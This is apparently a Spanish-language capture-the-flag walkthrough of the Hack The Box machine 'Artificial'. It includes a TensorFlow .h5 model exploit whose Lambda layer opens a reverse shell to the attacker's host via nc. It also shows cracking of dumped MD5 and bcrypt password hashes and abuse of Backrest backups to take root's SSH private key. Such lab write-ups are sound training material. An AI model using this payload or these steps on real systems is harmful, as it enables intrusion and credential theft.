---
tags: 
- tensorflow
- restic
- backrest
- crackstation
- ctf
permalink: /Artificial-HTB-Writeup
title: Artificial- Easy (HTB)
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introducción

`Artificial` es una máquina `Linux` de `fácil` dificultad que muestra la explotación de una aplicación web utilizada para ejecutar modelos de IA con `Tensorflow` y la interfaz de usuario web `Backrest` mediante el abuso de las funcionalidades de copia de seguridad y restauración y la utilidad `restic` utilizada por la aplicación.
# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.232.51                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 02:04 -03
Nmap scan report for artificial.htb (10.129.232.51)
Host is up (0.46s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Artificial - AI Solutions
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.36 seconds
```

## Website / Port 80 

![image-center](/assets/images/{2FA69DF2-6217-41C9-ADEA-9DBFABF5029F}.png)

Al entrar en la web no veo nada interesante mas que un panel de `login` y registro. Asi que me registro 

![image-center](/assets/images/{5AFE1E90-584A-4363-9858-AEFD8368EB47}.png)

Al estar logueado veo una sección donde podemos subir archivos con la extensión `*.H5*` (el cual es un tipo de archivo en el que se guarda data en formato `JSON` mayormente).

![image-center](/assets/images/{3EAC54A6-DEF1-4CF9-83FD-D3A01D12667E}.png)

Además en los botón de `requeriments` y `Dockerfile` me descargan los siguiente archivo con las especificaciones de uso, como para poder usar el propio archivo de `Docker` para crear el entorno con el mismo archivo.

### requirements.txt

En este archivo veo la versión de `TensorFlow` que necesito utilizar para poder crear mi archivo luego.

```bash
cat requirements.txt          
tensorflow-cpu==2.13.1
```

### Dockerfile

Aca veo un poco mas de lo mismo sabiendo las dependencias que se descargar al correr un contenedor con este archivo.

```bash
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```
### TensorFlow file

Al investigar por archivos `.h5` malicioso veo este [enlace](https://github.com/Splinter0/tensorflow-rce/blob/main/exploit.py). El mismo parece ser un PoC de una `Ejecucion remota de comandos (RCE)`, donde brinda un script en python3 con el siguiente contenido, el cual al ejecutarlo me deja un `.h5`.

```python
import tensorflow as tf
import os

def exploit(x):
    import os
    os.system("rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.17.19 6666 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Ahora ya puedo ejecutar el script pero creando un contendor yo mismo, mas que nada para que las versiones entre mi sistema y las necesitadas no se mezclen.

```bash
sudo docker run -it --rm -v "$PWD":/app -w /app tensorflow/tensorflow:2.13.0 python3 a.py
```

> `--rm -it` : Para crear un `contenedor` en un entorno aislado, parecido a `python -m venv`.
> `"$PWD":/app -w /app` : Montaje del directorio actual, haciendo que el contenedor tenga acceso al script el cual se va a ejecutar luego.
> `tensorflow/tensorflow:2.13.0` : Versión de `TensorFlow` a usar en el contenedor

Ahora ya puedo subir el archivo `model` mientras nos ponemos en escucha desde nuestra maquina.

```bash 
 ls
exploit.h5  poc.py  venv
```

Una vez subido el archivo tocamos en `View predictions` para así recibir nuestra `shell`.

![image-center](/assets/images/{D980F1FA-1E02-409F-A3C0-AD941C5F4925}.png)

Y desde listener `nc` después de unos segundos recibo la shell como `root` en un contenedor.

```bash
nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.232.51] 50784
/bin/sh: 0: can't access tty; job control turned off
$ whoami
app
```

## Shell as gael 

En el archivo `/etc/passwd` veo algunos usuarios de la maquina.

```bash
cat /etc/passwd | grep "bash"
root:x:0:0:root:/root:/bin/bash
gael:x:1000:1000:gael:/home/gael:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

### DB file

También si voy al directorio de la app, veo un archivo `SQLite3`.

```bash 
ls
users.db
```

El mismo puedo usarlo para poder dumpear los datos del archivo. 

```bash
sqlite3 users.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(100) NOT NULL, 
        email VARCHAR(120) NOT NULL, 
        password VARCHAR(200) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username), 
        UNIQUE (email)
);
INSERT INTO user VALUES(1,'gael','gael@artificial.htb','c99175974b6e192936d97224638a34f8');
INSERT INTO user VALUES(2,'mark','mark@artificial.htb','0f3d8c76530022670f1c6029eed09ccb');
INSERT INTO user VALUES(3,'robert','robert@artificial.htb','b606c5f5136170f15444251665638b36');
INSERT INTO user VALUES(4,'royer','royer@artificial.htb','bc25b1f80f544c0ab451c02a3dca9fc6');
INSERT INTO user VALUES(5,'mary','mary@artificial.htb','bf041041e57f1aff3be7ea1abd6129d0');
INSERT INTO user VALUES(6,'zs1n','zs1n@zs1n.com','412a1ed6d21e55191ee5131f266f5178');
CREATE TABLE model (
        id VARCHAR(36) NOT NULL, 
        filename VARCHAR(120) NOT NULL, 
        user_id INTEGER NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
);
INSERT INTO model VALUES('8c208a5c-ec7b-4df8-9206-2239c4a4fae4','8c208a5c-ec7b-4df8-9206-2239c4a4fae4.h5',6);
INSERT INTO model VALUES('391044ce-a2b3-4d22-9af2-736e36d4f1d2','391044ce-a2b3-4d22-9af2-736e36d4f1d2.h5',6);
COMMIT;
```

Veo el hash del usuario `gael` en formato `md5` parece. El mismo lo puedo romper en [crackstation](https://crackstation.net/).

![image-center](/assets/images/{C70383DA-43A8-4EF7-BA8B-0504B5CC159C}.png)

Una vez tengo las credenciales : `gael:mattp005numbertwo` puedo loguearme por `SSH`.

```bash
ssh gael@artificial.htb
The authenticity of host 'artificial.htb (10.129.232.51)' can't be established.
gael@artificial.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

[..snip..]

Last login: Sat Nov 29 05:30:54 2025 from 10.10.17.19
gael@artificial:~$
```

```bash
gael@artificial:~$ cat user.txt 
32e8606749fa35684234d8c80d6e231f
```
## Shell as root

### Enumeration

Despues de enumerar manualmente todo el sistema como el usuario `gael` veo que tiene corriendo 3 servicios como maquina host.

```bash
gael@artificial:~$ netstat -tulpn 
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -    
```

Para poder tener acceso a los esos puertos vuelvo a iniciar sesión por `ssh` haciendo un `Port forwarding` de estos puertos

```bash 
ssh gael@artificial.htb -L 5000:127.0.0.1:5000 -L 9898:127.0.0.1:9898
```

## Backrest

Al ver que es lo que hay en esto puertos vemos que es una pagina llamada **Backrest** 

![image-center](/assets/images/{BC13C4DF-63E8-442D-A8D8-2037F1C64183}.png)

>`Backrest` es una interfaz web y orquestador para `Restic`, una herramienta de copia de seguridad. [Backrest](https://garethgeorge.github.io/backrest/) proporciona una interfaz gráfica para gestionar fácilmente las `copias` de seguridad realizadas con `Restic`, facilitando la creación de repositorios, la exploración de instantáneas y la restauración de archivos a través de un navegador web. Mientras que `Restic` es la potente herramienta de línea de comandos subyacente, `Backrest` `simplifica` su uso

Como para entrar debo tener credenciales validas, al probar la de `gael` y los otros usuarios encontrados no son validas.

### Backrest as backup_root

enumerando el sistema en el directorio `/var/backup`s, podemos ver un `backrest_backup.tar.gz`.

```bash
gael@artificial:/var/backups$ ls
apt.extended_states.0     apt.extended_states.2.gz  apt.extended_states.4.gz  apt.extended_states.6.gz
apt.extended_states.1.gz  apt.extended_states.3.gz  apt.extended_states.5.gz  backrest_backup.tar.gz
```

Con `scp` descargo el archivo a mi maquina.

```bash
scp gael@artificial.htb:/var/backups/backrest_backup.tar.gz /tmp/backrest_backup.tar.gz
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
gael@artificial.htb's password: 
backrest_backup.tar.gz
```

Lo descomprimo en el directorio `/tmp` de mi maquina `tar` para ver su contenido 

```bash
tar -xvf backrest_backup.tar.gz                    
backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
backrest/tasklogs/
backrest/tasklogs/logs.sqlite-shm
backrest/tasklogs/.inprogress/
backrest/tasklogs/logs.sqlite-wal
backrest/tasklogs/logs.sqlite
backrest/oplog.sqlite
backrest/jwt-secret
backrest/processlogs/
backrest/processlogs/backrest.log
backrest/install.sh
```

#### Crack password

Dentro de la ruta `/tmp/backrest/.config/backrest/conf.json` veo lo siguiente:

```json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

Como la `password` esta encriptada en formato `base64` ejecuto el siguiente comando, para ver su contenido real.

```bash
echo JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP | base64 -d 
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO 
```

El resultado es un hash en formato `bcrypt`, el mismo lo meto en un archivo y lo rompo con `hashcat`.

```bash
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt

[..snip..]

$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^

[..snip..]
```

Ahora que tengo las credenciales me puedo loguear.
### Web

![image-center](/assets/images/{EFDE5ED4-DE67-4296-813E-479A723AA1B7}.png)
## Repo

Al iniciar puedo ver una interfaz donde puedo `subir` o `crear` repositorios.

![image-center](/assets/images/{80FE3CB1-5D3A-4EBD-87F0-21CEE8893BF0}.png)

Así que dentro de la maquina como `gael` creamos en el directorio `/tmp/backrest` para luego poder especificar el `path` del mismo .

```bash
mkdir -p /tmp/backrest
```

Después con el siguiente comando un repositorio, donde le ponemos una contraseña

![image-center](/assets/images/{2A3FAB16-4505-4A11-BA28-CB1C4430A04F}.png)

Posterior a esto, puedo ver una interfaz para `checkear`, y `purgar` los repositorios y además un botón para ingresar comandos de `Restic`.

![image-center](/assets/images/{A5C0E698-C2BF-4A88-A778-E46F4A967912}.png)

Dentro de esta sección podemos intentar realizar un `backup` de la clave `RSA` del usuario `root`.

```bash 
backup -r zs1n /root/.ssh/id_rsa
```

![image-center](/assets/images/{98B20663-0570-415A-85ED-6458042D7DC5}.png)

Sin embargo por algun motivo me da error.

### Plans

![image-center](/assets/images/{24521009-DFB4-490F-B283-8801B0A49D25}.png)

En este seccion veo estas opciones.

![image-center](/assets/images/{3BD1842D-89C3-4653-B22B-DACCB58BBDC8}.png)
### Backup 

Le especifico el path donde le pongo `/root` como para hacer un `backup` de esa ruta y el mi repositorio.

![image-center](/assets/images/{3477D682-8CB4-4F67-9C0F-28316E24E040}.png)
## Exfil id_rsa key

Después veo el botón de `Backup Now` el cual si `clickeo` me realiza el `backup` y puedo ver en la maquina que se realizo correctamente.

```bash
gael@artificial:/tmp/backrest$ ls -la
total 32
drwxrwxr-x   7 gael gael 4096 Nov 29 06:14 .
drwxrwxrwt  12 root root 4096 Nov 29 06:15 ..
-r--------   1 root root  155 Nov 29 06:14 config
drwx------ 258 root root 4096 Nov 29 06:13 data
drwx------   2 root root 4096 Nov 29 06:13 index
drwx------   2 root root 4096 Nov 29 06:14 keys
drwx------   2 root root 4096 Nov 29 06:14 locks
drwx------   2 root root 4096 Nov 29 06:13 snapshots
```

Como se puede ver en la pagina puedo ver la `id_rsa` de `root`.

![image-center](/assets/images/{C37179C2-8E5B-40E6-A371-FAE23794D3B7}.png)

Si clickeo en ella y le doy a `restore path` me sale lo siguiente, donde le doy a `Restore`

![image-center](/assets/images/{EC5AC844-6326-40C0-95F4-809408089983}.png)

Es así como puedo veo un botón el cual me permite descargar el archivo en mi maquina.

![image-center](/assets/images/{B0BD5BEA-D509-4C4D-8A1B-35F0243012FF}.png)

Una vez lo descargo, al ser un comprimido uso el siguiente comando.

```bash
tar -xvf archive-2025-11-29-06-09-40.tar.gz 
id_rsa
```

Y ahora puedo ver la clave de `root`.

```bash
cat id_rsa              
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA5dXD22h0xZcysyHyRfknbJXk5O9tVagc1wiwaxGDi+eHE8vb5/Yq
[..snip..]
l8bhOOImho4VsAAAAPcm9vdEBhcnRpZmljaWFsAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

Le doy permisos de lectura 

```bash 
chmod 600 id_rsa 
```
### SSH

Y ahora la uso como clave de identidad para loguearme como `root` por `SSH`.

```bash
ssh -i id_rsa root@artificial.htb 
[..snip]

root@artificial:~#
```

```bash
root@artificial:~# cat root.txt 
70ecbf4bd931c744b9001763aeb6d1bc
```

`~Happy Hacking.`




